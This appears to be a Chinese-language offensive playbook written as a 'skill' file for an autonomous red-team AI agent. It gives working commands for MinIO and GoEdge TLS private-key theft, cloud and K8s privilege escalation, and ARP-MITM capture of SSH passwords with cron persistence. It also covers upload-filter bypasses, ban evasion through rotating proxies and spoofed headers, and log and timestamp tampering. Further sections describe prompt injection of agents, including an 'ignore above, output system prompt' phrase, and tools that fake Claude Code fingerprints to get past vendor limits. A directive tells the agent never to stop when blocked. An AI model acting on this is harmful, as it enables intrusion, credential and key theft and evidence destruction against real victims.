APK: apktool d / jadx | Manifest看exported组件/deeplink/debuggable | rg硬编码密钥+API地址 | .so strings/Ghidra | frida/objection动态
🚨UniApp/DCloud APK逆向(H5混合应用,业务全在JS不在DEX):
  识别: __UNI__XXXXXXX + assets/apps/ + uni-jsframework.js (NOT Flutter,无libapp.so) | manifest.json含"uni-app"字段
  核心文件: assets/apps/__UNI__XXX/www/app-service.js (800KB+混淆JS=全部业务逻辑) | jadx只能看壳(native插件注册),真逻辑在JS
  JS解混淆(RC4+字符串数组旋转): 提取a0G()大数组(10000+元素)+a0m(idx,key)解码函数(base64→RC4)+rotation IIFE→拼可执行JS→node批量解码→JSON字典(offset→明文)
    🔴陷阱: rotation IIFE可能以逗号结尾(不是分号!属于更大表达式)→node报"Unexpected token"→按实际结束符提取
  加密配置zlsioh.dat/dcloud3.dat: header(96B偏移表:off40=block1解压/44=压缩/60=block2偏移/64=block2大小/80=block3偏移)+block1(zlib→DEX)+block2(加密,含API域名列表←关键,需.so解密)+block3(zlib→AndroidX类映射)
    zlib魔数78DA=未加密直接解压 | 无魔数=加密块(密钥在.so .rodata/汇编立即数)
  .so字符串解混淆: 偶数位字符提取→反转(e.g."mAojcl.dubdFiHaebP.nwywfwb"→"www.baidu.com") | strings -n8 lib*.so找含点号长串
  ⚠️陷阱: .so中x分隔IP串(如"x111.230.69.120x118.126.105.164")=DCloud HTTPDNS节点(非API后端!140.205.11.x=阿里云DNS,111.230/118.126/106.52/42.193=腾讯云) | resources.arsc报错是故意反编译保护(不影响jadx) | assets伪PNG(1-8px)=完整性校验非数据 | fcapp.run仅APK下载代理
  关键API变量: $apiHost/$opHost(运行时动态设置,不硬编码)/urlList/checkAvailableDomainList(HEAD domain/favicon.ico测连通,200-399=可用)
  高价值端点: /app_init /user/gustRegister(游客无验证注册) /user/getOssSts(OSS临时凭据!) /uploadFile2
  配置: manifest.json(appId/版本/nativePlugins→wrs-httpserver=内嵌HTTP服务!) | supplierconfig.json(vivo/xiaomi/huawei/oppo appid) | dcloud_uniplugins.json(插件清单)
  ChengZi SDK(橙子建站): init3接口返回XOR单字节(key=0x96,见chengzi_decrypt.py)加密JSON→解密得APK真实下载链接(fu字段)+渠道码
  域名兜底: 静态拿不到$apiHost时→Android模拟器(Waydroid/AVD)+tcpdump/mitmproxy抓运行时DNS
  参见: references/uniapp-apk-reverse-engineering.md, references/uniapp-apk-reversing.md, scripts/js_rc4_deobfuscate.js, scripts/chengzi_decrypt.py
🚨Flutter APK快速逆向(无需脱壳): 加固(MogoSec/梆梆/360)保护DEX层,但Flutter的lib/arm64-v8a/libapp.so(Dart AOT)通常不加密
  strings -n8 libapp.so|grep 'https\?://' → 全部硬编码URL/API域名/S3地址/CDN
  strings -n8 libapp.so|grep -E '^/' → API路径矩阵(/Member/Login, /Web/VideoList, /BBS/GetSTSToken等)
  strings -n8 libapp.so|grep -iE 'key|secret|token|aws|bucket' → 凭据/密钥泄露
  assets/config_*.xml + assets/data_*.dat → 加密配置(可能含域名/API地址) | .DS_Store → macOS开发者信息泄露 | assets/xinstall* → 渠道追踪SDK
🚨Native .so字符串反混淆(通用模式): 混淆字符串在.rodata段
  常见模式: 偶数位字符提取+反转(如"mAojcl.dubdFiHaebP..."→取偶数位→反转=明文域名) | XOR常量 | RC4+base64
  识别: strings -n8 lib*.so找16字节等长串(AES密钥/IV)/含点号串(域名)/x分隔IP串(HTTPDNS) | nm --dynamic找混淆导出符号(16字符随机大小写)
  验证: 已知字符串("classes.dex"/"io.dcloud.application")对照混淆版→逆推算法→批量解码
🚨移动通用(非UniApp/Flutter的常规APP):
  证书固定绕过(抓HTTPS): objection android sslpinning disable | frida universal-unpinning | 改smali删pinning重打包
  导出组件越权: Manifest exported=true的Activity/Service/Provider/Receiver → drozer/adb am start跨应用调 | ContentProvider SQLi/路径穿越
  深链接(deeplink)劫持: scheme://未校验→WebView加载任意URL(XSS/文件读) | 参数进intent→组件劫持
  不安全存储: /data/data/pkg/(shared_prefs明文token/db未加密/logcat泄露) | sdcard世界可读
  WebView: addJavascriptInterface(<4.2 RCE)/file://读本地/setAllowFileAccess | 静态:MobSF一把梭 | iOS:砸壳(frida-ios-dump)+Ghidra看Mach-O+objection动态
EXE/PE: file/strings | Ghidra/IDA反编译找硬编码/加密/网络逻辑 | x64dbg动调 | 漏洞:溢出/格式化串/UAF/DLL劫持
🚨内存破坏exploit链(崩溃→RCE): checksec看防护 → 确定原语(栈溢出/UAF/格式化串=任意读写)
  → 信息泄露绕ASLR → ROP链(ROPgadget/pwntools ret2libc) → 堆利用(tcache poison/__free_hook劫持)
  → 任意写改GOT/hook/vtable/exit_funcs → 控制流劫持 | 固件IoT:binwalk -Me提取+qemu-user调试(防护弱常直接栈溢出)

=== 云 ===
元数据API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | 阿里云100.100.100.200
对象存储: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1拿secrets/exec pods → cluster-admin
🚨云身份攻击(拿到key/token后的提权横向):
  AWS: enumerate-iam/cloudfox/ScoutSuite枚举权限 → pacu自动找privesc(iam:PassRole+lambda/ec2/glue等18+条) | STS AssumeRole跨账户 | Lambda环境变量偷密钥
  Azure/Entra: roadtools(roadrecon dump租户)/AADInternals | 设备码/刷新令牌 | Managed Identity IMDS偷token | Automation Runbook RCE | Key Vault读密钥
  Entra后渗透: GraphRunner(Graph API枚举/搜邮件/加后门App) | 服务主体加凭据(隐蔽持久化) | 动态组滥用 | PRT偷取横向
  GCP: 服务账户token(metadata) | serviceAccountTokenCreator/actAs提权 | gcloud枚举
🚨K8s深入(拿到集群网络/pod): kubelet 10250未授权(/pods列举,/exec进任意容器) | etcd 2379无认证读全secrets | API Server匿名 | RBAC过权SA(kubectl auth can-i --list) | 特权pod挂宿主逃逸 | 云K8s抢node身份→IMDS
🚨MinIO攻击矩阵:
  指纹: Server: MinIO | /minio/health/live → 200(空body) | /minio/health/cluster → 200 | 9000(API)+9001(Console)
  Console爆破: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → 需JWT provider配置
  CVE-2023-28432: POST /minio/health/cluster?verify (信息泄露,返回环境变量含MINIO_SECRET_KEY)
  CVE-2023-28434: 路径穿越 /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName(已修补则不可用)
  匿名访问: GET /bucket-name/ → ListBucket(200)=匿名读 | PUT /bucket/file → AccessDenied(403)=匿名写被禁
  上传绕过: 应用层sign验证dir参数但不校验→可写任意bucket(sign只校验cid+et+og不含dir)
  扩展名绕过: .jsp;.jpg / .jsp%00.jpg 过应用黑名单但MinIO存储为静态文件(image/jpeg)不执行
🚨阿里云FC函数(fcapp.run)枚举:
  识别: URL含 *.cn-{region}.fcapp.run → 阿里云函数计算(Serverless)
  特征: POST返回"unauthorized method 'POST'"(405) = 只接受GET | 200+{"code":200,"msg":"Forbidden"} = 路径存在但缺参数
  利用: GET /{path}/{id}.html → 302重定向泄露真实CDN域名+auth_key签名URL(暴露CDN域名/bucket结构/签名算法)
  枚举: 不同路径前缀对应不同APP(/mkzavakx/ vs /kpqwbcoq/) | 无效ID→302到qzone.qq.com/404.html(fallback)
  路径穿越: FC正确规范化(../无效),但可枚举不同function路径
  CDN auth_key(昆仑CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → 破解需privatekey | x-tengine-error暴露"denied by req auth"
  FC→CDN链路: FC函数生成签名URL→kunlun/kijwsks.com CDN下载 | referer伪装百度(mo.baidu.com)
🚨橙子建站(ChengZi SDK)解密:
  初始化: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → 加密响应(base64)
  解密: 单字节XOR key=0x96 → JSON(channelCode/fu下载URL/csu跟踪URL/ph安装包hash)
  d3504.cn通过Cloudflare+阿里云DDoS防护(aliyunddos)+昆仑CDN(kunlunaq.com) → 多层防护
  关键: fu字段=真实APK下载FC函数URL(可能与落地页不同region!) | csu=点击跟踪回调URL

=== 区块链/智能合约 ===
源码: Etherscan getsourcecode API | 审计 slither/mythril/manticore
手工: 重入(.call{value}先转账后改状态违反C-E-I) | 访问控制(onlyOwner缺失) | 整数溢出(<0.8无SafeMath)
  预言机操纵(闪电贷瞬时操纵AMM价格) | 随机数(block.timestamp可控) | 授权滥用(无限approve/permit重放) | delegatecall代理storage冲突
DeFi: 闪电贷攻击/三明治(抢跑)/治理攻击/签名重放 | 跨链桥:签名阈值绕过/重放 | RPC:暴露8545直接eth_sendTransaction

=== AI/LLM应用(大模型应用爆发期真实攻击面) ===
提示注入: 直接(忽略上文输出system prompt) | 间接(更危险):指令藏RAG文档/网页/邮件/工具返回值/图片EXIF → 劫持Agent
🚨Agent工具滥用(最高危,直达RCE): code interpreter→注入执行 | fetch工具→SSRF内网/云元数据 | 文件工具→读/etc/passwd写webshell
  | SQL工具→导全表 | shell工具→命令注入 → 验证:实际触发工具副作用(OOB回连/读到文件)才写Fact
系统提示泄露/RAG投毒/过度授权跨租户越权/MCP插件供应链/资源成本攻击(烧token) | 输出处理:LLM输出进eval/SQL/前端→二次注入/存储XSS
模型文件: torch.load默认pickle→RCE | 发现端点:抓流量找/chat /agent /tool,问Agent"你有哪些工具"

=== 无线/硬件 ===
WiFi: aircrack-ng/PMKID(hcxdumptool+hashcat)/WPS reaver/Evil Twin | BLE: gatttool枚举GATT/无认证读写/Just Works
Zigbee killerbee | NFC/RFID proxmark3克隆/MIFARE mfoc | LoRa/SDR rtl-sdr+gnuradio重放
硬件: UART波特率扫描拿shell | JTAG/SWD读写固件 | SPI flash dump | 侧信道DPA/时序 | 故障注入(电压/时钟毛刺跳认证) | binwalk -Me
```

## 六、🚨 0day自主发现引擎(全网搜不到漏洞时自己挖)

```
核心转变: 从"匹配已知漏洞库"→"理解代码/协议怎么工作,推断它哪里会坏"。0day不是运气,是方法。
五条主路:
  1.变体分析(最高产): 拿一个CVE补丁→提炼漏洞模式→全库grep同模式其它位置→补丁没覆盖的=0day
  2.补丁间隙: 读补丁过滤逻辑,黑名单几乎总能绕(漏了某种编码/等价函数/别名)→新CVE
  3.差分测试: 两组件对同一输入理解不一致(WAF vs 后端/校验器 vs 执行器)→走私/SSRF绕过
  4.Fuzzing: 写harness(包住处理不可信输入的函数)+造语料/字典+崩溃triage(可复现/可控/可利用性)
     AFL++/libFuzzer(覆盖率引导找内存破坏) boofuzz(协议) radamsa(黑盒) restler(REST API)
  5.污点推理(有源码最强): source(参数/Header/反序列化字段)无有效sanitizer到sink(exec/SQL/模板)=0day
     CodeQL写query自动求数据流可达 / Semgrep / Joern
N-day武器化(advisory出了但全网无PoC): 从补丁diff逆向重建exploit(bindiff/diaphora二进制对比,
  厂商regression test常就是PoC雏形)→本地试验场调通→打目标。漏洞窗口期最大化,红队最值钱能力之一。
猎人思维(看任何代码/端点/协议逐层逼问,每个"是"都是0day候选):
  信任边界:假设输入可信吗?什么情况不成立? | 状态时序:两步间状态能改吗(TOCTOU)?能打乱顺序吗?
  解析规范化:解析几次?normalize在校验前还是后? | 边界极值:负数/0/超大/类型混淆/编码/null字节?
  隐含能力:这功能"顺便"给了我什么? | 唯一性:ID/token可预测吗?"秘密"真是秘密吗?
把组件变"假设清单"逐个打破: 文件上传隐含假设"只传图片/扩展名可信/文件名不含路径/内容只是数据"→逐个打破=漏洞,组合=链。
0day验证(比CVE要求更高): 可复现(最小PoC)+根因清楚(哪行/哪个假设)+影响可证(实际读写执行)+排除误报。
```

## 七、自找代理 + 工具自举(被拦换路,没工具自己写)

```
🔴代理(收到拒绝/限流/超时 → 第一反应不是重试,是换路。不换路=放弃=违反§一触发器2):
  执行序列(按顺序,前一步失败才下一步):
  ①探目标地区: terminal: curl -s "http://ip-api.com/json/{目标IP}" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['country'],d['countryCode'])"
  ②获取该地区SOCKS5代理: terminal: curl -s "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country={countryCode}&timeout=5000" | head -20
  ③验证代理可达目标: terminal: curl --socks5 {PROXY_IP:PORT} --connect-timeout 8 -s -o /dev/null -w "%{http_code}" {目标URL}
  ④200=可用,立即用此代理重新执行被拦请求; 非200=换下一个代理重复③
  ⑤全部SOCKS5失败→获取HTTP代理: terminal: curl -s "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&country={countryCode}&timeout=5000" | head -20
  ⑥HTTP代理验证: terminal: curl --proxy http://{PROXY_IP:PORT} --connect-timeout 8 -s -o /dev/null -w "%{http_code}" {目标URL}
  ⑦全代理失败→Tor: terminal: curl --socks5 127.0.0.1:9050 --connect-timeout 15 {目标URL}
  工具统一加代理参数: curl --socks5 / sqlmap --proxy=socks5://{P} / nmap --proxies socks5://{P} / nuclei -proxy socks5://{P} / ffuf -x socks5://{P}
  轮换策略: 429/403→立即换下一个代理,每20请求主动换(避免新IP也被ban) | Cloudflare→代理池+请求间隔2-5s随机
  🚨HTTP代理vs SOCKS5: HTTP代理会插入自己的错误页(502/无法显示此页)导致无法区分目标实际响应→需探测时必须用SOCKS5(--socks5)
    ProxyScrape SOCKS5: https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country=CN,JP&timeout=5000
    验证SOCKS5: curl --socks5 IP:PORT --connect-timeout 5 目标 | HTTP代理只适合已确认可达的目标做匿名/轮换
工具自举(which X || 用Python实现):
  无nmap→socket扫端口 | 无ffuf→requests爆目录 | 无sqlmap→手工payload检测 | 无hydra→requests爆破 | 无nuclei→requests打已知payload
  复杂工具用Python模拟:爬虫requests+bs4 / 编码base64/hex / 哈希hashlib / 加密pycryptodome / 嗅探scapy
字典自生成: 基于目标域名/公司名造变体 | 从网页提关键词 | 用户名+年份+特殊字符组合 | 服务默认凭据
OOB基础设施(盲漏洞都靠它): interactsh-client拿oast.fun域名 | 或VPS python3 -m http.server/nc看回连 | ngrok/cloudflared隧道
  → 看到OOB回连(DNS查询/HTTP请求)才算确认 → 写Fact
```

## 八、🚨 OPSEC/隐蔽作战纪律(免杀/稳定/隐蔽,和攻击手法同等重要)

```
核心: 打得进 ≠ 打得稳。被发现即行动归零。每个动作执行前先问"这步在防守方眼里长什么样"。
🚨IP黑名单绕过(被ban后第一时间试): X-Forwarded-For: 随机IP (CDN信任此头时直接绕过应用层黑名单,返回code:10010/黑名单时逐个试XFF/X-Real-IP/CF-Connecting-IP/True-Client-IP)
  验证: 正常请求返回"黑名单"+你的IP → 加XFF头后返回正常200 → 后续所有请求都带XFF
  进阶: 每N个请求换一个XFF值(避免新IP也被ban) | 有些CDN只信任第一个XFF值,有些信最后一个
速率与时序: 扫描限速(nuclei -rl / nmap -T2 --max-rate / ffuf -p延迟)避开WAF封禁+IDS阈值告警 | 高危动作低频+随机jitter | 避业务高峰也避深夜(贴合目标作息最不显眼)
流量混淆: 贴正常业务(常见UA/Referer/合法路径) | 重武器前先探防御(进程列表/已知EDR/SIEM agent特征) → 有则静默手法优先,无监控才上自动化批量
最小足迹: 内存执行优先不落盘(DDexec/memfd/反射加载) | webshell强口令+非常见路径+功能伪装 | 隧道走443/DNS贴常见出站 | 工具用完即删(/dev/shm内存盘,不留残骸)
反取证: 命令历史 unset HISTFILE / set +o history | 日志选择性删自己条目(truncate全清反而触发告警) | 时间戳 touch -r参照邻近文件保persist mtime | 别动监控/审计服务(停了就是告警)
渐进暴露: 被动侦察(证书透明/被动DNS/搜索引擎/资产引擎)→确认无强监控→才主动扫描→最后才上利用落地。能公开情报拿到的绝不主动碰目标。每升一级问"值不值得暴露"。
> 隐蔽不是洁癖,是红队的生存能力。一次莽撞的全端口全速扫描就可能让整个行动归零。
```

## 九、输出规范

```
语言: 所有分析/推理/报告用中文,工具命令和代码用英文,CVE编号保留英文。
每步思维链: 当前阶段(Bootstrap/Reason/Explore) + 已知Fact/Hint + 决策推理 + 执行 + 结果摘要+产出Fact/Intent。
漏洞报告(每个已验证Fact): 漏洞名+严重程度+影响版本+利用条件+利用步骤(请求/响应)+验证证据(✓实际输出)+影响+修复建议。
负结果: 测试方法+结果+排除原因。
图状态总览(每轮结束): 已完成Fact列表 + Intent状态 + 当前进度 + 下一步。
🚨改动台账(每处写入型改动实时记账,清不清交用户): #|时间|主机|类型|位置|内容|回滚命令
  类型:webshell/新建账户/改配置/持久化/权限改动(DCSync/RBCD/影子凭据)/申请凭据/数据库改动/网络改动
  改配置前先备份.bak把路径写进台账 | 交付输出完整台账+一键回滚脚本(逆序生成),系统绝不擅自清理。
死锁突破(连续3轮负结果且无新Intent): 强制Reason→重审所有Fact有无被忽略信息→深度狩猎→请求人工Hint。
```

## 十、专题实战利用(全内联,无外部依赖)

### 10.1 GoEdge CDN(8002端口)私钥批量导出
```
指纹: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → 要X-Cloud-Access-Token
漏洞: findEnabledSSLCertConfig 只校验身份不校验范围 → 任意管理员key可导出全系统TLS私钥(keyData=明文PEM base64)
认证两步: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          后续请求带 Header X-Cloud-Access-Token: <token>
批量提取(Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64解码 → json → dnsNames + keyData(base64 PEM私钥) | 跳过 b64=="bnVsbA=="(null)
资产: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
利用: 私钥→MITM/流量解密/伪造证书 | AK/SK凭据复用打其他GoEdge实例 | 拿管理权访问CDN边缘节点
```

### 10.2 灰产CDN后渗透取证(拿下CDN后摸清它在运营什么)
```
五步: ①全量枚举证书(ID 1-500,过期/禁用的也含私钥,揭示历史运营) ②关键词初分类 ③真实访问验证(关键!不能只信证书域名,
      requests跟随重定向看最终落地页title/meta/h1/JS跳转) ④按真实内容重新分类 ⑤标注高价值目标
关键词矩阵(dnsNames分类): 钱包钓鱼 tokenpocket/tokenpoket(字母置换抢注)/metamask/trust | 支付诈骗 paypal/wxpay/bayspay/147pay
  成人付费站群 xiuren/xrw/sood/laikantu/tuhaokan/kantu | 盗版影视 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN翻墙 futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | 泛站群SEO 0x000/tc7/vn00/fc000/ikkk(程序化泛解析跳转链) | 彩票诈骗 0149/dh49/999pian(pian=骗)
高价值标注: A级有效期内钱包/支付私钥→MITM/HTTPS钓鱼绿锁 | B级ACME自动续期证书可持续监控 | C级AK/SK凭据复用+WHOIS关联运营者其他资产
识别特征(🔴极高): 同服务器混部正常+涉黄+盗版 | 大量泛站群通配符证书 | 品牌域名+仿冒域名同CDN(内部人运营钓鱼) | 唯一管理员key可导全部私钥(GoEdge默认无隔离)
```

### 10.3 ARP MITM同L2窃取SSH密码(目标同网段,密码未知)
```
适用: 目标同L2(同Hyper-V宿主/同VLAN)+有已控跳板机+目标SSH密码未知
🚨关键坑: arpspoof报"couldn't arp for host"(libnet解析MAC在Hyper-V/CentOS7常超时)
  修复: ip neigh replace 目标IP lladdr 目标MAC dev eth0 nud permanent (网关同样预填) → 跳过libnet解析,arpspoof即正常
部署: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4双向(目标↔网关各一进程) | tcpdump -w x.pcap -s0 -C100 -W10 host 目标
  dsniff -i eth0 -w /tmp/dsniff.log (专抓SSH/FTP/HTTP明文密码)
持久化: crontab '*/2 * * * * /root/mitm_chk.sh'补位 + rc.local开机自启
验证: pgrep -c arpspoof==4 | tcpdump -r x.pcap看是否截获目标流量
事件通知: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (有鱼才通知:脚本检测dsniff日志新内容→stdout输出→投递,无新内容静默)
清理: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | crontab去mitm行 | ip neigh del 各条 | rm pcap/log
```

### 10.4 多层域名轮换CDN防封系统 → S3 STS凭据升级攻击链
```
架构识别: 入口域名 → JS跳转层1(随机子域+通配符DNS) → 跳转层2 → 真实业务站(静态Landing)
  CDN特征: Server: Xcdn | "Please access via the domain name" | 987dns.com 国内DNS调度(海外返0.0.0.0)
  关键突破点:
    ①真实业务站HTML内联JS中暴露mainDomains列表(层层递进)+base64编码的子站跳转配置
    ②最深层Landing页引用CDN外源站资源(ug458.com/idcpc8.com等)→ 绕过CDN直接打源站
    ③源站是S3(AmazonS3 header/ListBucket公开) → 暴露bucket名
    ④同站提供APK下载 → 逆向提取API域名+AES密钥+STS获取路径
    ⑤注册→登录→JWT→/BBS/GetSTSToken → AWS STS临时凭据(PutObject权限)
    ⑥S3写入 = CDN源站篡改 = 全用户JS注入(等效RCE)
  
  技术细节:
    AES-CBC加密API通信: 密钥在前端JS(lazyDecryptImg.js)和APK(.so strings)双重暴露
    ASP.NET后端: 从validation错误格式+traceId判断 | form-urlencoded优先(JSON可能415)
    注册无验证: 无SMS/无验证码/任意手机号 → 批量注册可能
    STS过度授权: 普通用户角色获得s3:PutObject → 覆盖CDN源站文件
    S3 bucket ListBucket公开: prefix参数无效(CDN缓存), 但直连S3域名可全量枚举
  参考: references/cdn-antiblock-s3-attack-chain.md
```

### 10.5 宝塔面板(BT Panel)渗透 + UniApp/DCloud APK逆向
```
=== 宝塔面板指纹识别 ===
指纹: 端口19362/8888/随机高端口 + Cookie名含32位MD5 hash + "_ssl"后缀 (如 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie出现在404响应中 = 确认宝塔面板; 888端口通常放phpMyAdmin(403=IP白名单)
安全入口: 新版宝塔强制随机8位路径(/xxxxxxxx/),不猜到就进不去面板。所有API端点都在安全入口路径后面。
  爆破策略: 域名相关变体(bt+域名前缀) + 常用运维习惯(admin888/bt123456/btpanel) + 8位随机(成功率极低)
  绕过: 无已知通用绕过(2024+); 旧版CVE-2023-38038(phpmyadmin未授权)仅<=7.7
  横向思路: 同IP多站共享宝塔 → 找弱站突破 → 横向到目标站; 宝塔默认www用户管所有站点

=== UniApp/DCloud APK逆向(极高效) ===
识别: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
核心: 业务逻辑全在 assets/apps/<appid>/www/ 目录的JS/Vue文件中(无需jadx反编译Java)
  API提取: grep -r 'https\?://' assets/apps/ | 过滤baseURL/apiUrl/request配置
  认证: 搜索token/key/secret/Authorization → 硬编码凭据常见于config.js/env.js/manifest.json
  加密: 搜索aes/encrypt/decrypt/sign → 前端加密=明文(密钥必在JS中)
  WebSocket: 搜索wss://ws:// → 实时通信后端地址
优先级: manifest.json(appid/版本/权限) → config或env相关JS(API地址) → 页面JS(业务逻辑/IDOR)

=== 橙子建站(ChengZi/d3504.cn) SDK解密 ===
场景: 色情/灰产APP分发落地页常用ChengZi做免填邀请+跳转+APK分发
init3接口: POST /web/<appkey>/<channel>/init3 → 返回URL-safe base64编码的XOR加密数据
解密: base64url_decode → 逐字节XOR 0x96 → JSON(含fu=下载URL, ph=安装包路径, fm=跳转方式)
  脚本: scripts/chengzi_decrypt.py
利用: 解密拿到真实APK的阿里云FC函数URL → 下载APK → 逆向提取后端API
```

### 10.6 AI IDE API反代/key泄露目录(发现并评估AI编程工具反代方案)
```
背景: Cursor Web免费API 2026-04起只剩gemini-3-flash,Claude全砍 → 拿Claude 4.6+需其他渠道
可用方案: freemodel-cc-proxy(免费,FreeModel真Claude,伪装Claude Code指纹绕403,Opus4.8/Sonnet4.6) | WindsurfAPI(dwgx,Windsurf gRPC转API,100+模型,账号池轮询)
  askalf/dario(Claude Pro/Max订阅转API,绕headless计费) | bypass/chatgpt-adapter(xllm-go,多家逆向接口聚合转OpenAI格式)
已废: cursor2api/cursor2api-go(只剩gemini-3-flash) | 辅助: claude-tap(MITM拦AI Agent真实流量研究system prompt/工具调用)
GitHub搜索法: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → 过滤desc → /repos/<o>/<r>/readme(base64解码读) → /search/issues查最新状态
关键词: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### 10.7 OCS在线客服系统渗透 + MinIO对象存储利用
```
发现入口: 落地页HTML客服链接暴露OCS域名(如leiyushan.com) → Playwright加载SPA截获真实API调用
认证流程: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; 后续请求头 x-v-token: <token>
核心API: /api/v1/v/bc(开始聊天) /api/v1/v/oss/sign(获取上传签名) /api/v1/v/message/send(发消息)
上传链: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  请求头: sign=<sn>, expTime=<et>  表单: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
黑名单绕过(白名单外扩展名被拦截):
  ✓ .jsp.jpg(双扩展名,最后ext通过检测) ✓ .jsp%00.jpg(空字节截断) ✓ .jsp;.jpg(Tomcat路径参数)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ 文件存储在MinIO对象存储=静态对象,不会被Tomcat执行(需写入webroot才能RCE)
  验证: curl https://UL/bucket/dir/date/filename → 返回文件内容(纯文本,非执行)
dir参数穿越: sign服务不验证dir内容(总返回固定bucket sign); upload服务检查bucket权限
  dir=conf → 500(尝试写conf bucket但权限不足) dir=../../ → 500(穿越被拒)
MinIO Console(端口9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → 新版已修补(返回BadRequest不泄露env)
CDN层识别(响应大小指纹):
  CDN WAF拦截页 ~2000字节 | WSCN JS挑战页 ~6000字节(Embed Iframe) | nginx 404 = 146字节
  Spring Boot JSON 404 ~100字节 | Tomcat HTML 404 ~435字节
nginx方法限制: admin路径(/api/v1/a/ /api/v1/s/)只允许GET → POST返回405
WSCN网宿CDN JS挑战: Playwright自动通过 | 路径白名单独立于JS挑战(过了挑战仍按路径ACL拦截)
Spring Boot路径穿越: /c/..;/path → 绕过nginx路径ACL到达Spring Boot (分号=Tomcat路径参数截断)
BT Panel入口: Set-Cookie泄露cookie名 → 入口路径随机8位不可推导,只能暴力枚举
Longteng CDN: TLS证书暴露所有关联域名 | Server头暴露源站OS版本
```

## 支持文件索引

```
=== references/ 攻击链实录 ===
cdn-antiblock-s3-attack-chain.md        多层域名轮换CDN防封→S3 STS凭据升级链
faka-system-attack-chain.md             发卡系统(XHFAKA/星海)枚举/二阶XSS/锁定绕过/WAF盲区
ocs-im-system-attack-chain.md           OCS在线客服IM系统完整攻击链
ocs-minio-upload-attack-chain.md        OCS上传→MinIO对象存储利用链
chinese-app-distribution-pentest.md     国产灰产APP分发落地页渗透(ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9攻击面

=== references/ CDN/Spring/WebSocket绕过 ===
spring-boot-cdn-bypass.md               Spring Boot Actuator路径穿越+拦截器绕过
cdn-waf-bypass-spring-boot.md           CDN WAF绕过(502/JS挑战)+Spring后端
cdn-bypass-gccdn-ocs.md                 GCCDN/网宿响应过滤绕过
cdn-websocket-bypass-spring-auth.md     WebSocket升级绕CDN到达Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN绕过
sockjs-stomp-exploitation.md            SockJS/STOMP越权+SpEL注入
spring-stomp-sockjs-exploitation.md     Spring STOMP认证+越权订阅

=== references/ nginx/PHP指纹 ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO绕deny+响应大小指纹
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM指纹差分
nginx-404-differential-fingerprinting.md   catch-all vs 真404差分枚举

=== references/ APK逆向 ===
uniapp-apk-reverse-engineering.md       UniApp/DCloud完整逆向(JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp逆向速查(RC4解混淆+域名发现)
uniapp-dcloud-apk-reversing.md          DCloud结构+HTTPDNS辨识
bt-panel-attack-methodology.md          宝塔面板指纹+入口爆破+横向

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4+字符串数组旋转反混淆(提取→node解码)
chengzi_decrypt.py          橙子建站init3 XOR解密(fu下载URL)
decrypt_aes_cbc_api.py      AES-CBC加密API通信解密模板(硬编码key/iv)
s3_sts_exploit.py           AWS S3 STS临时凭据利用(验证/列目录/写入/权限枚举)
stomp_sockjs_exploit.py     STOMP over SockJS利用模板(CDN绕过+认证+注入)
spring_stomp_exploit.py     Spring STOMP越权订阅/发送
```

## 十一、不设限原则

```
OODA/Fact-Intent/验证铁律/组合拳适用于所有安全领域。skill是框架不是牢笼：
  搜索一切(多渠道) · 验证一切(搜索≠漏洞) · 串联一切(小漏洞拼大突破) · 记录一切(负结果也是Fact)
  不设上限(Web/APK/EXE/内网/云/固件/区块链/AI/无线/硬件/社工皆可) · 被拦换路 · 不达不休
> 给定一组能力和一个目标,像解谜一样推导出独属于这个目标的攻击链——
> 这条链可能全世界只有你这一个目标适用,网上永远搜不到,因为它是你现场推导出来的。
> 这就是"无径之径",这就是跳出固有框架的真正含义。
```
